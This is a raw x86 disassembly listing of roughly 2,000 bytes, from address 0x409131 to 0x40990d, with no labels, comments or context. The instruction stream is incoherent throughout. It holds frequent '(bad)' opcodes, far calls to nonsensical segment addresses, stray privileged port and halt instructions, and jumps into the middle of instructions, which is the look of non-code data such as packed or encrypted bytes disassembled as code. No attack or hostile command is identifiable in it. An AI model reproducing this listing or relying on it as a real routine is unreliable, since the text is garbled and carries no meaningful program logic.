  409131:	jbe    0x409188
  409133:	cs pop esi
  409135:	scas   eax,DWORD PTR es:[edi]
  409136:	jmp    0x40917e
  409138:	aaa    
  409139:	fldenv [edx+eiz*8-0xd0e7d2b]
  409140:	out    dx,al
  409141:	xchg   edx,eax
  409142:	lock and DWORD PTR [edi],0x18d18f37
  409149:	cwde   
  40914a:	nop
  40914b:	xor    al,0x84
  40914d:	sbb    BYTE PTR [ecx],bl
  40914f:	loop   0x40914e
  409151:	jae    0x4090de
  409153:	call   0xe588:0x16809f45
  40915a:	sbb    ah,ch
  40915c:	hlt    
  40915d:	pop    esp
  40915e:	shl    dl,0xf8
  409161:	mov    cl,cl
  409163:	push   eax
  409164:	aaa    
  409165:	mov    dl,0x8c
  409167:	or     al,bl
  409169:	call   0x13a2:0x5cca49f0
  409170:	or     al,0x60
  409172:	pop    ecx
  409173:	je     0x409118
  409175:	jo     0x40913c
  409177:	dec    ebx
  409178:	jl     0x40910c
  40917a:	sub    DWORD PTR [edx],0xffffffa3
  40917d:	stos   DWORD PTR es:[edi],eax
  40917e:	data16 fst QWORD PTR [esi*4-0x64d2a1b3]
  409186:	call   0x7033:0xea6e4530
  40918d:	dec    esi
  40918e:	adc    DWORD PTR [esp+ebp*2],ebx
  409191:	fmulp  st(7),st
  409193:	(bad)  
  409194:	mov    ah,0x39
  409196:	hlt    
  409197:	stc    
  409198:	scas   eax,DWORD PTR es:[edi]
  409199:	out    0x2d,al
  40919b:	inc    ecx
  40919c:	pushf  
  40919d:	xchg   DWORD PTR [edi],esi
  40919f:	loop   0x4091af
  4091a1:	xchg   edx,eax
  4091a2:	sub    dl,BYTE PTR [ecx]
  4091a4:	push   es
  4091a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a6:	and    cl,bl
  4091a8:	jg     0x409214
  4091aa:	sbb    cl,BYTE PTR [ebp+ecx*1+0x21b48b54]
  4091b1:	adc    DWORD PTR [esi-0x11],ebp
  4091b4:	inc    eax
  4091b5:	mov    ds:0x4609a754,al
  4091ba:	das    
  4091bb:	mov    ah,0x85
  4091bd:	and    DWORD PTR [ecx],esi
  4091bf:	outs   dx,DWORD PTR ds:[esi]
  4091c0:	mov    DWORD PTR [ebp+0x197dce3b],eax
  4091c6:	cmp    ebx,esp
  4091c8:	push   cs
  4091c9:	push   0xfffffff7
  4091cb:	outs   dx,DWORD PTR ds:[esi]
  4091cc:	mov    ?,WORD PTR [esi+eax*1-0x6e021565]
  4091d3:	lock sbb ch,BYTE PTR [ebp+0x5dbd6572]
  4091da:	dec    edi
  4091db:	call   0x1496b40f
  4091e0:	mov    al,0xf6
  4091e2:	cdq    
  4091e3:	dec    edx
  4091e4:	mov    dl,0xae
  4091e6:	pop    edi
  4091e7:	inc    ebp
  4091e8:	push   ebp
  4091e9:	pop    edx
  4091ea:	outs   dx,BYTE PTR ds:[esi]
  4091eb:	mov    bl,bh
  4091ed:	jns    0x409266
  4091ef:	(bad)  
  4091f1:	mov    eax,0x1a0860f7
  4091f6:	mov    ds:0xf27735f3,eax
  4091fb:	sbb    DWORD PTR [ebx],ebx
  4091fd:	fld    st(6)
  4091ff:	jbe    0x409238
  409201:	scas   al,BYTE PTR es:[edi]
  409202:	push   cs
  409203:	fnstsw WORD PTR [ebp-0xcec55a2]
  409209:	sbb    BYTE PTR [ebx+0x5612e2eb],dh
  40920f:	cmp    bl,bl
  409211:	aaa    
  409212:	loope  0x40922a
  409214:	imul   eax,DWORD PTR [edx+0x77],0xdf1e8939
  40921b:	jnp    0x409207
  40921d:	repz mov bl,0x22
  409220:	xchg   DWORD PTR ds:0x2c1fe0df,ebx
  409226:	jmp    DWORD PTR [ebp+0x5c]
  409229:	jne    0x409206
  40922b:	iret   
  40922c:	jle    0x409267
  40922e:	in     al,dx
  40922f:	mov    dh,dh
  409231:	pop    ss
  409232:	push   eax
  409233:	fld    QWORD PTR [esi+0x47]
  409236:	jmp    FWORD PTR [esi+0x5a]
  409239:	mov    edx,0xc2bd47d5
  40923e:	loop   0x409267
  409240:	lods   eax,DWORD PTR ds:[esi]
  409241:	fdiv   DWORD PTR [eax+0x65]
  409244:	int    0x24
  409246:	ret    0x1d8c
  409249:	ret    
  40924a:	sub    eax,eax
  40924c:	pop    esi
  40924d:	ret    0x205f
  409250:	(bad)  
  409251:	dec    eax
  409252:	scas   eax,DWORD PTR es:[edi]
  409253:	mov    edi,0x7ec57149
  409258:	lods   al,BYTE PTR ds:[esi]
  409259:	push   es
  40925a:	push   edi
  40925b:	lahf   
  40925c:	cmc    
  40925d:	in     al,0x78
  40925f:	out    0xe8,al
  409261:	cdq    
  409262:	xchg   edi,eax
  409263:	lods   eax,DWORD PTR ds:[esi]
  409264:	pop    edx
  409265:	int3   
  409266:	xchg   DWORD PTR [edi+ecx*4-0x319aa147],ecx
  40926d:	sub    DWORD PTR [ebx+ebp*2-0x4c],0xffffffb5
  409272:	mov    ah,0x38
  409274:	dec    edx
  409275:	xor    DWORD PTR [esi-0x744cd79d],esi
  40927b:	imul   esi,DWORD PTR ds:[edi],0x7fa363e8
  409282:	sti    
  409283:	add    ebx,DWORD PTR [edx+ebx*4]
  409286:	inc    esp
  409287:	je     0x40920f
  409289:	xchg   edi,eax
  40928a:	out    dx,eax
  40928b:	out    0x2f,al
  40928d:	cli    
  40928e:	mov    al,ds:0x5a40ff8d
  409293:	retf   0x2d29
  409296:	pop    ds
  409297:	loope  0x4092f3
  409299:	js     0x40921f
  40929b:	fiadd  WORD PTR [eax]
  40929d:	xor    eax,0xb9c612b3
  4092a2:	sbb    DWORD PTR [edx],ebx
  4092a4:	sub    eax,0x6cb3f8a6
  4092a9:	and    bl,BYTE PTR [esi]
  4092ab:	out    0x99,al
  4092ad:	xor    BYTE PTR [ebx+0x66934e75],0xdb
  4092b4:	jmp    0x409324
  4092b6:	mov    eax,DWORD PTR [edx-0x598310c9]
  4092bc:	add    al,0xd4
  4092be:	test   al,0x44
  4092c0:	fld    TBYTE PTR [edi]
  4092c2:	mov    ds:0xd67997d3,eax
  4092c7:	cwde   
  4092c8:	out    dx,al
  4092c9:	std    
  4092ca:	fild   DWORD PTR [edi+0x55fc729b]
  4092d0:	inc    ebx
  4092d1:	cmp    DWORD PTR [edx],esp
  4092d3:	mov    ds:0xc1980650,al
  4092d8:	mov    dh,0x2d
  4092da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092db:	sbb    BYTE PTR [ebp+0x16],bh
  4092de:	out    0xf,eax
  4092e0:	bound  ebx,QWORD PTR [eax+0x2e229873]
  4092e6:	cld    
  4092e7:	adc    edx,ecx
  4092e9:	dec    esp
  4092ea:	repnz in al,0xc3
  4092ed:	cmp    bh,0x8e
  4092f0:	mov    esi,0xa11cb136
  4092f5:	dec    edi
  4092f6:	test   BYTE PTR [ecx],0x6f
  4092f9:	loopne 0x4092d1
  4092fb:	enter  0xadc3,0xf5
  4092ff:	mov    eax,ds:0xfaff0b79
  409304:	mov    ebx,DWORD PTR [ebp+0x331949b1]
  40930a:	mov    eax,ds:0xbd67840d
  40930f:	add    BYTE PTR [ecx+0x52a6a257],bl
  409315:	and    DWORD PTR es:[ebx+0x33],edi
  409319:	jo     0x40931d
  40931b:	cmp    eax,0x13fa8cd7
  409320:	mov    edi,0x9da5df4e
  409326:	ss dec esp
  409328:	sub    edi,DWORD PTR [edi]
  40932a:	loopne 0x409377
  40932c:	jo     0x4092f1
  40932e:	call   0x8e636204
  409333:	pop    ss
  409334:	out    dx,al
  409335:	sub    DWORD PTR [eax+0x3b],ebp
  409338:	sbb    DWORD PTR [edx-0x2cf3d033],ecx
  40933e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933f:	mov    al,0x2f
  409341:	call   0x9f8:0x6c8bc835
  409348:	jno    0x40932a
  40934a:	mov    edx,DWORD PTR ds:0xab04e99e
  409350:	scas   al,BYTE PTR es:[edi]
  409351:	inc    ebp
  409352:	dec    bh
  409354:	dec    ebx
  409355:	cmp    edx,ebx
  409357:	jae    0x409342
  409359:	xchg   edx,esi
  40935b:	push   cs
  40935c:	xlat   BYTE PTR ds:[ebx]
  40935d:	ss aas 
  40935f:	push   cs
  409360:	retf   0x179f
  409363:	aad    0x67
  409365:	es aad 0xb7
  409368:	dec    esi
  409369:	aas    
  40936a:	xchg   edx,eax
  40936b:	sbb    eax,0x9305a1ff
  409370:	inc    edx
  409371:	jns    0x4092fb
  409373:	xchg   ebx,eax
  409374:	jmp    0x119b:0x6ada7439
  40937b:	out    0x1f,al
  40937d:	push   es
  40937e:	aaa    
  40937f:	shl    DWORD PTR [esi],1
  409381:	sub    edi,DWORD PTR [esi+0x67028189]
  409387:	out    dx,eax
  409388:	into   
  409389:	test   al,0xcc
  40938b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40938c:	xor    esp,DWORD PTR [edx+0x49]
  40938f:	sti    
  409390:	in     eax,0x42
  409392:	out    0xdb,eax
  409394:	cmp    ecx,edi
  409396:	sbb    BYTE PTR [eax+0x17aafd1b],0x10
  40939d:	mov    DWORD PTR [eax-0x3c],eax
  4093a0:	adc    DWORD PTR [esi],ebx
  4093a2:	adc    cl,al
  4093a4:	dec    ebx
  4093a5:	push   edi
  4093a6:	aaa    
  4093a7:	outs   dx,BYTE PTR ds:[esi]
  4093a8:	jae    0x409393
  4093aa:	les    eax,FWORD PTR [ebp+ebx*1+0x6ee3e264]
  4093b1:	and    DWORD PTR [ebp+0x746f9bf8],esi
  4093b7:	hlt    
  4093b8:	dec    ebx
  4093b9:	cdq    
  4093ba:	xchg   esi,eax
  4093bb:	xchg   BYTE PTR [edx],ch
  4093bd:	xlat   BYTE PTR ds:[ebx]
  4093be:	in     al,0x49
  4093c0:	adc    eax,0xde2e7bff
  4093c5:	push   ebx
  4093c6:	mov    bh,0x4f
  4093c8:	in     eax,dx
  4093c9:	repnz dec esp
  4093cb:	inc    ebp
  4093cc:	xchg   ebx,eax
  4093cd:	fwait
  4093ce:	outs   dx,BYTE PTR ds:[esi]
  4093cf:	pushf  
  4093d0:	in     al,0x54
  4093d2:	hlt    
  4093d3:	imul   ecx,DWORD PTR [esi-0x2bc63726],0xe594dea4
  4093dd:	out    0xdb,al
  4093df:	into   
  4093e0:	pop    eax
  4093e1:	fidivr DWORD PTR [edi]
  4093e3:	fcom   st(6)
  4093e5:	sub    edx,ecx
  4093e7:	sbb    BYTE PTR [ebx],bh
  4093e9:	leave  
  4093ea:	in     al,dx
  4093eb:	ret    0x7cfc
  4093ee:	(bad)  
  4093ef:	(bad)  
  4093f0:	repnz pop ebx
  4093f2:	shl    BYTE PTR [ebp-0x596f8cc4],cl
  4093f8:	dec    ebx
  4093f9:	mov    BYTE PTR [edx-0x5b14ac],ch
  4093ff:	add    BYTE PTR [eax+0x10a1b8c9],al
  409405:	(bad)  
  409406:	sub    ch,BYTE PTR cs:[esi-0x8]
  40940a:	shr    ah,cl
  40940c:	mov    eax,0x3ada6cf3
  409411:	sub    eax,0x1748d47c
  409416:	cdq    
  409417:	cmp    al,0x52
  409419:	jg     0x409473
  40941b:	test   bl,dh
  40941d:	iret   
  40941e:	cmp    DWORD PTR [ebp-0x70],eax
  409421:	cmp    eax,0x23d20ebe
  409426:	mov    cl,0xba
  409428:	cmp    BYTE PTR [ebx+0x65],al
  40942b:	in     al,0x20
  40942d:	push   cs
  40942e:	les    esi,FWORD PTR [eax+0x7e]
  409431:	in     al,0xa6
  409433:	pop    edi
  409434:	mov    bl,BYTE PTR [edi+0x40]
  409437:	(bad)  
  409438:	lds    edx,FWORD PTR [edi-0x3d18848e]
  40943e:	add    esp,esp
  409440:	jo     0x40948d
  409442:	retf   0x41b0
  409445:	(bad)  
  409446:	(bad)  
  409447:	fdivp  st(7),st
  409449:	xor    al,BYTE PTR [esi+0x7a4db71a]
  40944f:	sbb    ebp,DWORD PTR [ebp-0x5d]
  409452:	push   cs
  409453:	idiv   BYTE PTR [esi]
  409455:	inc    esp
  409456:	(bad)  
  409457:	cmp    BYTE PTR [ebx],ch
  409459:	push   esp
  40945a:	data16 add cl,bl
  40945d:	in     eax,0xf
  40945f:	jne    0x40946e
  409461:	fcomip st,st(2)
  409463:	test   eax,0xa940e4ec
  409468:	ds pop esi
  40946a:	pop    ds
  40946b:	cli    
  40946c:	cmp    DWORD PTR [edi+ecx*2],edx
  40946f:	mov    al,ds:0xb324695e
  409474:	popa   
  409475:	and    DWORD PTR [ebp-0x7e4eff38],esp
  40947b:	xchg   esp,eax
  40947c:	xchg   edi,eax
  40947d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40947e:	mov    ebx,ebp
  409480:	inc    esi
  409481:	std    
  409482:	mov    cs,WORD PTR [ecx]
  409484:	jb     0x409421
  409486:	lods   eax,DWORD PTR ds:[esi]
  409487:	rcl    BYTE PTR [eax],0x9d
  40948a:	out    dx,eax
  40948b:	inc    ebp
  40948c:	cmp    esi,eax
  40948e:	or     al,0x31
  409490:	cdq    
  409491:	lea    edi,[eax]
  409493:	sbb    DWORD PTR [edx+0x3d],edx
  409496:	mov    bh,0x79
  409498:	xchg   BYTE PTR [edx+0x3b748d57],bl
  40949e:	(bad)  
  40949f:	in     al,0xdb
  4094a1:	leave  
  4094a2:	in     eax,dx
  4094a3:	adc    ebp,0xffffff85
  4094a6:	pop    ebx
  4094a7:	aam    0x2c
  4094a9:	adc    edx,DWORD PTR [edx+eax*1]
  4094ac:	(bad)  
  4094ad:	icebp  
  4094ae:	outs   dx,DWORD PTR ds:[esi]
  4094af:	lds    ecx,FWORD PTR [esi+0x27bf9ae7]
  4094b5:	mov    edx,0xfc03ce40
  4094ba:	push   eax
  4094bb:	aaa    
  4094bc:	rcr    esi,1
  4094be:	push   ebp
  4094bf:	push   eax
  4094c0:	ret    
  4094c1:	sbb    eax,0xda3e79e7
  4094c6:	std    
  4094c7:	add    ch,ch
  4094c9:	cmp    DWORD PTR [esi],esi
  4094cb:	cmp    ebx,DWORD PTR [edx+edx*1-0x3b]
  4094cf:	(bad)  
  4094d0:	fsub   QWORD PTR [eax+0x45d3c48b]
  4094d6:	add    ebp,ebp
  4094d8:	mov    ebp,0x9e650f1c
  4094dd:	push   ecx
  4094de:	test   eax,0x67ae093f
  4094e3:	loopne 0x4094fd
  4094e5:	xor    DWORD PTR [eax+0x56],edx
  4094e8:	nop
  4094e9:	mov    ch,0x37
  4094eb:	or     ch,0xdf
  4094ee:	jo     0x4094b4
  4094f0:	pop    esp
  4094f1:	jmp    0x6bdb:0xdd281fa1
  4094f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094f9:	imul   ebx,ebx,0x99393dc8
  4094ff:	shl    ch,cl
  409501:	enter  0xc31c,0x38
  409505:	pop    eax
  409506:	inc    esi
  409507:	inc    ebx
  409508:	jbe    0x4094ca
  40950a:	daa    
  40950b:	fimul  DWORD PTR [ebx+ebp*8+0x5f]
  40950f:	je     0x409566
  409511:	inc    esi
  409512:	test   eax,0x47461874
  409517:	sub    BYTE PTR [edx+0x71bbd567],ah
  40951d:	aaa    
  40951e:	mul    BYTE PTR [edx+0x65b0c311]
  409524:	cmp    eax,0x26328556
  409529:	aad    0x21
  40952b:	in     al,0xb
  40952d:	pop    ecx
  40952e:	and    eax,0xc8e860d1
  409533:	pop    esi
  409534:	push   ds
  409535:	inc    eax
  409536:	mov    bh,0xf2
  409538:	stos   BYTE PTR es:[edi],al
  409539:	mov    ebp,0x7cd79795
  40953e:	dec    edx
  40953f:	hlt    
  409540:	xchg   esi,eax
  409541:	rcr    DWORD PTR [edx+eax*8-0x51ce93f0],1
  409548:	xor    dl,ch
  40954a:	dec    esp
  40954b:	sub    eax,DWORD PTR [ecx-0x16]
  40954e:	mov    esi,0x683f2a19
  409553:	cmp    eax,0x3adc6998
  409558:	in     eax,dx
  409559:	test   al,0xf6
  40955b:	popa   
  40955c:	ins    DWORD PTR es:[edi],dx
  40955d:	int3   
  40955e:	test   bl,0xb
  409561:	(bad)  
  409562:	je     0x4095c1
  409564:	cdq    
  409565:	mov    ss,WORD PTR ds:0xe3a0592f
  40956b:	add    cl,BYTE PTR [edx]
  40956d:	aas    
  40956e:	pop    ds
  40956f:	sti    
  409570:	jnp    0x40951d
  409572:	sbb    esi,DWORD PTR [ecx+esi*4]
  409575:	jle    0x4095d5
  409577:	cwde   
  409578:	push   esp
  409579:	ins    DWORD PTR es:[edi],dx
  40957a:	imul   edi,DWORD PTR [esi+0x7455073],0x2d99e487
  409584:	sar    DWORD PTR [esi],cl
  409586:	sbb    al,0xa0
  409588:	fcomp  QWORD PTR [ebx]
  40958a:	and    DWORD PTR [edi-0x7c101fa0],ecx
  409590:	mov    edi,0xb263c863
  409595:	bnd js 0x409556
  409598:	push   esi
  409599:	mov    gs,WORD PTR [edx]
  40959b:	push   edi
  40959c:	imul   ebp,DWORD PTR [edi-0x3],0x39f98f6c
  4095a3:	addr16 mov edi,0xf7ee6699
  4095a9:	loope  0x4095fb
  4095ab:	sahf   
  4095ac:	mov    ecx,0xd0e59492
  4095b1:	add    dl,BYTE PTR [eax]
  4095b3:	sub    dh,BYTE PTR [ebx-0xe]
  4095b6:	or     eax,0xffffff97
  4095b9:	pop    eax
  4095ba:	add    al,0x9c
  4095bc:	fdivr  QWORD PTR [esp+eiz*4+0x41]
  4095c0:	inc    ebp
  4095c1:	push   ds
  4095c2:	aaa    
  4095c3:	(bad)  [ebp-0x40f48694]
  4095c9:	pusha  
  4095ca:	lds    esi,FWORD PTR [edx-0x67]
  4095cd:	dec    esp
  4095ce:	fild   DWORD PTR [ebp+0x378f7828]
  4095d4:	xor    ch,BYTE PTR [edi]
  4095d6:	cmc    
  4095d7:	cmp    ch,BYTE PTR [ecx-0x43871c57]
  4095dd:	mov    cl,0xf4
  4095df:	repz inc esp
  4095e1:	jo     0x409571
  4095e3:	add    eax,0xdc4db63a
  4095e8:	jle    0x4095e9
  4095ea:	xchg   ebx,eax
  4095eb:	xchg   BYTE PTR [esi-0x26a71ec5],cl
  4095f1:	sbb    ecx,DWORD PTR ds:0xeb2bdafa
  4095f7:	int    0xd5
  4095f9:	jecxz  0x409613
  4095fb:	je     0x4095bb
  4095fd:	push   0xfffffffd
  4095ff:	aad    0xac
  409601:	or     al,0xeb
  409603:	cmp    esi,DWORD PTR [eax-0x7c]
  409606:	out    0x27,eax
  409608:	push   esp
  409609:	inc    edx
  40960a:	fndisi(8087 only) 
  40960c:	and    ebx,edi
  40960e:	dec    esi
  40960f:	dec    esp
  409610:	cs xchg ecx,eax
  409612:	cmp    bl,BYTE PTR [edi*4+0x6e090ff7]
  409619:	pop    ds
  40961a:	out    0xf8,al
  40961c:	call   0x28853e93
  409621:	js     0x4095e0
  409623:	nop
  409624:	jbe    0x4095ad
  409626:	lock xlat BYTE PTR ds:[ebx]
  409628:	dec    esi
  409629:	repz arpl WORD PTR [eax],cx
  40962c:	outs   dx,DWORD PTR ds:[esi]
  40962d:	mov    ecx,0x85f11e5f
  409632:	xchg   ch,bh
  409634:	sahf   
  409635:	ja     0x409632
  409637:	in     al,0x8
  409639:	shr    BYTE PTR ds:0x10cfe225,0xab
  409640:	neg    DWORD PTR [ebx+0x4e]
  409643:	clc    
  409644:	cs jae 0x40966e
  409647:	mov    ebp,0x152d868a
  40964c:	xchg   ebx,eax
  40964d:	sub    BYTE PTR ds:0x805fab0b,dh
  409653:	ds jo  0x409607
  409656:	cmp    dh,dl
  409658:	pop    edi
  409659:	icebp  
  40965a:	(bad)
  40965e:	and    ecx,esp
  409660:	lods   al,BYTE PTR ds:[esi]
  409661:	idiv   ah
  409663:	add    DWORD PTR [edi-0x7],edx
  409666:	test   eax,0xeb3e9d5c
  40966b:	data16 mov cl,0x8c
  40966e:	or     eax,DWORD PTR ds:0xe92e0ad4
  409674:	pop    edx
  409675:	add    edx,DWORD PTR [edi-0x6]
  409678:	(bad)  
  409679:	outs   dx,BYTE PTR ds:[esi]
  40967a:	retf   0xbe83
  40967d:	je     0x409610
  40967f:	sti    
  409680:	idiv   BYTE PTR [edi+0x2]
  409683:	sub    ax,0xc212
  409687:	ins    DWORD PTR es:[edi],dx
  409688:	cmp    al,0x74
  40968a:	es in  al,dx
  40968c:	jp     0x40961a
  40968e:	neg    DWORD PTR [eax-0x590a2654]
  409694:	mov    esi,0x79c7c1ab
  409699:	push   0xfffffff8
  40969b:	xor    bl,bh
  40969d:	mov    bh,0x39
  40969f:	push   esi
  4096a0:	and    bh,BYTE PTR [esi]
  4096a2:	jecxz  0x40967e
  4096a4:	jle    0x409673
  4096a6:	push   0x5eb8e0ed
  4096ab:	sbb    al,0x7c
  4096ad:	fild   QWORD PTR [edx+ecx*8+0x236d7cc9]
  4096b4:	xor    DWORD PTR [ecx],eax
  4096b6:	xchg   esp,eax
  4096b7:	mov    cl,0x5c
  4096b9:	in     eax,0xa2
  4096bb:	push   esi
  4096bc:	jo     0x40964d
  4096be:	add    esi,esi
  4096c0:	or     ah,BYTE PTR [esi+0x73a2366c]
  4096c6:	clc    
  4096c7:	sahf   
  4096c8:	pop    ebx
  4096c9:	ja     0x4096e3
  4096cb:	into   
  4096cc:	shl    dh,1
  4096ce:	in     al,0x49
  4096d0:	adc    al,BYTE PTR [di]
  4096d3:	test   eax,0x396060ad
  4096d8:	jns    0x409666
  4096da:	cli    
  4096db:	sbb    eax,0xefba26d
  4096e0:	enter  0x464b,0xdd
  4096e4:	and    al,0x9d
  4096e6:	lods   al,BYTE PTR ds:[esi]
  4096e7:	fwait
  4096e8:	add    al,0xe0
  4096ea:	js     0x40969b
  4096ec:	gs xor eax,0x8d712a18
  4096f2:	jmp    0x4096cb
  4096f4:	xor    DWORD PTR ds:0xb7ba80df,ebp
  4096fa:	pop    ebp
  4096fb:	gs push es
  4096fd:	push   edx
  4096fe:	jg     0x409717
  409700:	xchg   edi,eax
  409701:	add    ebx,esi
  409703:	test   DWORD PTR [esi+0x660d8308],edx
  409709:	lods   al,BYTE PTR ds:[esi]
  40970a:	xor    DWORD PTR [eax+ebx*8],ecx
  40970d:	popf   
  40970e:	enter  0x76ca,0x3f
  409712:	jbe    0x4096ea
  409714:	sahf   
  409715:	mov    ecx,0x1f99ab56
  40971a:	or     eax,0x33750fdf
  40971f:	(bad)  
  409720:	sub    esp,DWORD PTR [esi]
  409722:	dec    ecx
  409723:	leave  
  409724:	jle    0x4096d1
  409726:	shr    BYTE PTR [ebp-0x2a4a4331],0xa
  40972d:	pop    ecx
  40972e:	jmp    DWORD PTR [esi-0x26]
  409731:	sbb    edx,DWORD PTR [ecx+0x30f26de5]
  409737:	sub    cl,BYTE PTR [eax-0x571609d8]
  40973d:	and    DWORD PTR [esp+eiz*8-0x55],ebp
  409741:	cld    
  409742:	jp     0x409762
  409744:	mov    ecx,0x80537062
  409749:	mov    WORD PTR [edi-0x28],es
  40974c:	into   
  40974d:	add    dh,cl
  40974f:	mov    DWORD PTR [eax-0xa27718e],ebx
  409755:	ins    DWORD PTR es:[edi],dx
  409756:	ret    0xe037
  409759:	or     dl,ah
  40975b:	sar    DWORD PTR [edx],0xd0
  40975e:	lods   eax,DWORD PTR ds:[esi]
  40975f:	cmc    
  409760:	in     eax,dx
  409761:	mov    ebp,0x79d36175
  409766:	ror    bh,1
  409768:	xor    ebp,0x93208e8c
  40976e:	mov    ebp,0x7da3071d
  409773:	aad    0x62
  409775:	xchg   edi,eax
  409776:	out    0xbd,eax
  409778:	sub    al,0xd4
  40977a:	dec    edx
  40977b:	pushf  
  40977c:	retf   0xddb6
  40977f:	fistp  DWORD PTR ss:[edi]
  409782:	jne    0x4097b5
  409784:	sahf   
  409785:	or     eax,0x97dc523
  40978a:	gs jmp 0xafec:0xc8de87ef
  409792:	or     ah,BYTE PTR [esi+0x50fb8a19]
  409798:	and    eax,0x111539b
  40979d:	outs   dx,BYTE PTR ds:[esi]
  40979e:	jle    0x409720
  4097a0:	ds jge 0x4097b6
  4097a3:	fiadd  WORD PTR [eax+ebp*1-0x2]
  4097a7:	imul   ebx,edi,0xc566fdbb
  4097ad:	stos   DWORD PTR es:[edi],eax
  4097ae:	clc    
  4097af:	mov    esp,0x7cc2703e
  4097b4:	aad    0x14
  4097b6:	xchg   esp,eax
  4097b7:	sbb    al,0x48
  4097b9:	jp     0x409790
  4097bb:	dec    ecx
  4097bc:	add    BYTE PTR [eax],dh
  4097be:	and    al,0x43
  4097c0:	hlt    
  4097c1:	addr16 mov bl,0xf0
  4097c4:	mov    DWORD PTR [ebx],edi
  4097c6:	pusha  
  4097c7:	jmp    0x6378c6bd
  4097cc:	iret   
  4097cd:	in     eax,0x6b
  4097cf:	ins    BYTE PTR es:[edi],dx
  4097d0:	sub    cl,BYTE PTR [edi-0x2eabec6f]
  4097d6:	inc    esi
  4097d7:	sbb    eax,DWORD PTR [eax]
  4097d9:	(bad)  
  4097da:	loop   0x4097e3
  4097dc:	inc    edi
  4097dd:	and    DWORD PTR [ebx+0x2e],0xffffffd1
  4097e1:	repz je 0x4097f2
  4097e4:	fcmovbe st,st(3)
  4097e6:	or     ch,bh
  4097e8:	test   eax,0xeb87f25a
  4097ed:	sti    
  4097ee:	ficom  WORD PTR [edx]
  4097f0:	xchg   DWORD PTR [eax+0x43],eax
  4097f3:	push   ds
  4097f4:	fwait
  4097f5:	into   
  4097f6:	leave  
  4097f7:	adc    al,0x27
  4097f9:	sub    al,0x9c
  4097fb:	inc    edx
  4097fc:	mov    esp,0xee17a5e6
  409801:	inc    ebx
  409802:	ret    
  409803:	mov    esi,0x91a65c9f
  409808:	sub    cl,BYTE PTR [edx-0x271025e7]
  40980e:	pop    edx
  40980f:	aas    
  409810:	inc    esp
  409811:	xor    al,0x6c
  409813:	mov    ebp,0x2b0573d8
  409818:	sbb    DWORD PTR [eax+0x1d],edx
  40981b:	push   ds
  40981c:	mov    ah,0x34
  40981e:	loop   0x4097ff
  409820:	popf   
  409821:	mov    esi,0x569bf92f
  409826:	and    eax,edx
  409828:	add    edi,ebp
  40982a:	rol    BYTE PTR [esi],cl
  40982c:	xchg   ebx,eax
  40982d:	pop    ebp
  40982e:	aad    0xec
  409830:	outs   dx,BYTE PTR ds:[esi]
  409831:	add    eax,0x85d5aec
  409836:	int    0x82
  409838:	xchg   ebx,eax
  409839:	sub    al,BYTE PTR [eax]
  40983b:	ins    DWORD PTR es:[edi],dx
  40983c:	dec    eax
  40983d:	popf   
  40983e:	lods   al,BYTE PTR ds:[esi]
  40983f:	loope  0x409838
  409841:	hlt    
  409842:	adc    esi,edx
  409844:	pop    ss
  409845:	in     al,dx
  409846:	cmp    cl,ch
  409848:	sti    
  409849:	jle    0x409850
  40984b:	in     eax,0x43
  40984d:	dec    esi
  40984e:	pop    edi
  40984f:	lahf   
  409850:	sbb    al,0x7a
  409852:	xor    esi,edx
  409854:	mov    edx,esp
  409856:	pop    ebx
  409857:	add    BYTE PTR [eax+0x1f],bh
  40985a:	pmulhw mm5,mm0
  40985d:	popa   
  40985e:	out    dx,eax
  40985f:	ss cwde 
  409861:	js     0x4098bc
  409863:	pushf  
  409864:	push   0x5b225db8
  409869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40986a:	cmp    eax,0xc50de283
  40986f:	stc    
  409870:	out    0xee,eax
  409872:	mov    ch,0x98
  409874:	dec    esi
  409875:	lock ret 0xd551
  409879:	mov    ebx,0x911def7d
  40987e:	fs nop
  409880:	test   eax,0xaa889034
  409885:	fmul   QWORD PTR [esi+0x3a]
  409888:	out    0xee,al
  40988a:	mov    esp,0x38978ec8
  40988f:	rcl    al,cl
  409891:	cmp    dh,BYTE PTR [ebp-0x13]
  409894:	fwait
  409895:	sub    BYTE PTR [esi+0x51d03519],cl
  40989b:	jne    0x40985a
  40989d:	inc    ebp
  40989e:	push   eax
  40989f:	sub    eax,0xa5e41fc5
  4098a4:	cmp    BYTE PTR [edx],ah
  4098a6:	jge    0x4098cc
  4098a8:	(bad)  
  4098a9:	mov    fs,WORD PTR [esi-0x72]
  4098ac:	(bad)  [eax+0x53731263]
  4098b2:	nop
  4098b3:	je     0x409893
  4098b5:	pusha  
  4098b6:	pop    eax
  4098b7:	in     eax,0x8a
  4098b9:	push   ds
  4098ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098bb:	in     eax,dx
  4098bc:	out    dx,eax
  4098bd:	cmp    eax,DWORD PTR [ebx+0x18]
  4098c0:	add    ecx,DWORD PTR [esi]
  4098c2:	adc    bh,BYTE PTR [eax]
  4098c4:	out    dx,al
  4098c5:	sbb    al,0x90
  4098c7:	jb     0x409878
  4098c9:	cdq    
  4098ca:	sti    
  4098cb:	jp     0x409927
  4098cd:	mov    ds:0xc68cb073,al
  4098d2:	retf   0x2850
  4098d5:	mov    ?,WORD PTR [ecx]
  4098d7:	adc    al,0xe5
  4098d9:	sahf   
  4098da:	jne    0x4098ad
  4098dc:	or     edi,ebp
  4098de:	inc    edi
  4098df:	imul   ecx,DWORD PTR [edi],0xffffff91
  4098e2:	aaa    
  4098e3:	inc    edx
  4098e4:	add    al,0x16
  4098e6:	push   eax
  4098e7:	shl    DWORD PTR [edx-0x4eceb11a],1
  4098ed:	cmp    DWORD PTR [edx+0x10],ecx
  4098f0:	repz and al,bh
  4098f3:	xchg   ebp,eax
  4098f4:	mov    dh,0xae
  4098f6:	scas   al,BYTE PTR es:[edi]
  4098f7:	xchg   ebp,eax
  4098f8:	test   eax,0xa2c412df
  4098fd:	push   cs
  4098fe:	sub    cl,BYTE PTR [esi-0x3d]
  409901:	sub    ah,ah
  409903:	popf   
  409904:	pop    ss
  409905:	fmul   DWORD PTR [edx-0x6dc709b3]
  40990b:	inc    esp
  40990c:	(bad)  
  40990d:	and    eax,0xf7c107eb
